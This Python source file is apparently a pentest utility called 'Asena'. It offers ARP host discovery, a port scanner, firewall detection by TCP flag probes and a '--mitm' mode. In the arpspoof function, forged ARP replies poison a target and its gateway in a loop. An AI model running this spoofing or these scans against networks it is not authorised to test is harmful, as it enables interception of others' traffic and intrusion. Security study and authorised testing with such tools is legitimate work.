#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__="Mustafa GÜNDOĞDU"
print('''\t\t\t
@b3kc4t
        ______         ____________________          _________ 
       /    \ \       / / /| _________/    \        /  / /  \ \ 
      /  /\  \ \     / / / | |       /      \      /  / /    \ \ 
     /  /  \  \ \   / / /  | |      /  / /\  \    /  / /  /\  \ \ 
    /  /    \  \ \  \ \ \  | |_____/  / /  \  \  /  / /  /  \  \ \ 
   /  /______\  \ \  \ \ \ |  ____/  / /    \  \/  / /  /    \  \ \ 
  /  /        \  \ \ /_/_/ | |   /  / /      \    / /  /______\  \ \ 
 /__/          \  \ / / /  | |__/  / /        \__/_/  /        \  \ \ 
                \__/_/_/   |___/__/_/             /__/          \__\_\ 
                               __
                    /\||    /\ \ \      /\  
                   //\||   //\  \ \    //\           
                  //  ||  //     \ \  //        
                \//   ||\//      / /\//            
                \/    ||\/     _/_/\//          
                                               
''')
from scapy.all import *
import sys
import os
import socket
import argparse
import thread
import subprocess
class Asena:
    def __init__(self, port_list):
        self.port_list = port_list
    def main(self):
        desc = "Asena - Network Analyse Tool"
        parser = argparse.ArgumentParser(description=desc)
        
        o_option = parser.add_argument_group('Other option')
        parser.add_argument("-i",help="According to the process type ip address or ip subnet address", type=str,required=False)
        parser.add_argument("--interface",help="Interface information.",type=str,required=False)
        parser.add_argument("-s","--scan",help="Network Active Machine detection.",action="store_true")
        parser.add_argument("-f","--firewall",help="Asena is uses Tcp flags and Icmp message types for firewall detection",action="store_true")
        parser.add_argument("--pscan",help="Port scan on the target device",action="store_true")
        parser.add_argument("--mitm",help="This option is uses Man in the mittle attack and usage is: --mitm -t [target ip] -g [target gateway] ",action="store_true")
        parser.add_argument("-t",help="Target ip address",type=str,required=False)
        parser.add_argument("-g",help="Target gateway ip address",type=str,required=False)
        parser.add_argument("-v","--version",help="Asena Version Information",action="store_true")
        
        args = parser.parse_args()
        


        if args.scan:
            if args.i==None:
                sys.exit()
            else:
                sub = args.i
                i_face = args.interface
                self.packet(sub, i_face)
        elif args.firewall:
            if args.i == None:
                sys.exit()
            else:
                Ip=args.i
                self.f_Scanner(Ip)
        elif args.pscan:
            Ipv4 = args.i
            target_ip = Ipv4
            self.N_Scanner(target_ip)
        elif args.mitm:
            if args.t == None or args.g == None:
                sys.exit()
            else:
                trg_ip = args.t
                g_ip = args.g
                self.arpspoof(trg_ip, g_ip)
        elif args.version:
            print("Asena 2.1")



    def packet(self, sub, i_face):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            c = os.popen("ip -4 route show default").read().split()
            s.connect((c[2],0))
            ipaddr = s.getsockname()[0].split('.')

            #print ("Ip resolution result :",ipaddr)
            print ("[+]Starting arp request in the Network")
            m = []
            try:
                target_subnet = sub
                interface = i_face
            
            except:
                sys.exit(1)

            #Frame mac broadcast
            
            packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target_subnet)
            res = srp(packet,iface = interface,timeout=2,verbose=0)[0]
            kullanici = []
            m = []
            for sent, received in res:
                kullanici.append({'ip': received.psrc, 'mac': received.hwsrc})
                m.append(received.hwsrc)
            
                
            

            x = []
            newList = []
            result = []
            last_c = []
            d = []
            
            try:
                for i in m:
                    for j in range(1,4):
                        command = 'echo %s | cut -d ":" -f %s' %(i, j)
                        sonuc = subprocess.check_output(command, shell=True)
                        d.append(sonuc.split('\n')[0])
                    x.append(d[0]+d[1]+d[2]) 
                
                for sor in x:
                    command_x = 'grep -i -A 4 %s oui.txt | cut -f 3 ' %sor
                    c_sonuc = subprocess.check_output(command_x, shell=True)
                    if c_sonuc == None:
                        result.append('unknow')
                    else:
                        result.append(c_sonuc.split('\n'))
            
            
            
                print("Active Device in the Network:")
                print("IP" + " "*20+"MAC"+" "*25+"VENDOR")
            
                for k, info in zip(kullanici, result):
                
                    print("{:16}     {} ".format(k['ip'], k['mac'])+" "*10+info[:1][0])
            
            except:
                print("There is a problem Asena is Shutdown...!![-]")
                sys.exit(1)
            

        except KeyboardInterrupt:
            print ("Asena is Shutdown...")
            sys.exit()

    
    def f_Scanner(self,Ip):
        try:
            dst_ip = Ip
            try:
                for port in range(1, 65535):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((dst_ip, port))
                

                    if 0 == result:
                        o_port = port
                        self.port_list.append(o_port)



            except KeyboardInterrupt:
                print ("Asena Shutdowning...")
                sys.exit()

            for i in self.port_list:
                dst_port = i
                src_port = RandShort()
                a = sr1(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port))

                if (a.getlayer(TCP).flags==0x12):
                    ack_scan = sr1(IP(dst=dst_ip)/TCP(dport=dst_port, flags="A"),timeout=10)

                    if (str(type(ack_scan))=="<type 'NoneType'>"):
                        print("[+] Firewall Status(Filtered[!]) :",i)
                    elif(ack_scan.haslayer(TCP)):
                        if (ack_scan.getlayer(TCP).flags==0x4):
                            print("[-]No Firewall :",i)
                    elif (ack_scan.haslayer(ICMP)):
                        if(int(ack_scan.getlayer(ICMP).type)==3 and int(ack_scan.getlayer(ICMP).code in[1,2,3,9,10,13])):
                            print("[+]Firewall Status(Filtered[!]) :",i)
        except KeyboardInterrupt:
            print("Asena Shutdowning...")
            sys.exit()


    def N_Scanner(self,target_ip):
        try:
            for port in range(1,65535):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))

                if 0 == result:
                    o_port = port
                    self.port_list.append(o_port)

            

            for i in self.port_list:
                print ('[+] %d Numbered Port is Open \n'%i)

        except KeyboardInterrupt:
            print("Asena Shutdowning...")
            sys.exit()

    

    def arpspoof(self,trg_ip,g_ip):
        try:
           


            def G_MAC(trg_ip):
                arp_packet = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=trg_ip)
                trg_mac = srp(arp_packet, timeout = 2, verbose = False)[0][0][1].hwsrc
                return trg_mac

            def arp_spoof(trg_ip, trg_mac, src_ip):
                spoof = ARP(op = 2, pdst = trg_ip, psrc = src_ip, hwdst = trg_mac)
                send(spoof, verbose=False)
            
            #return back arpspoof
            def no_arp_spoof(trg_ip, trg_mac, src_ip, src_mac):
                packet = ARP(op=2, hwsrc = src_mac, psrc = src_ip, hwdst = trg_mac, pdst = trg_ip)
                send(packet, verbose=False)

            try:
                trg_mac = G_MAC(trg_ip)

                print ("[+] Target MAC ", trg_mac)
            except:
                print("[-]Target is not respond")
                quit()


            try:
                g_mac = G_MAC(g_ip)
                print("[+]Gateway MAC ", g_mac)

            except:
                print ("[-] May be an error in the gateway")

                quit()

            try:
                print("[[+]OK ! ]")

                while True:
                    arp_spoof(trg_ip, trg_mac, g_ip) #target machine spoof 
                    arp_spoof(g_ip, g_mac, trg_ip) #target gateway spoof

            except:
                print ("ARP Spoofing is Stoped [!]")
                no_arp_spoof(g_ip, g_mac, trg_ip, trg_mac)
                no_arp_spoof(trg_ip, trg_mac, g_ip, g_mac)
                quit()

        except KeyboardInterrupt:
            print ("Asena is Shutdown...")
            sys.exit()



    

port_list = []
o1 = Asena(port_list)
o1.main()


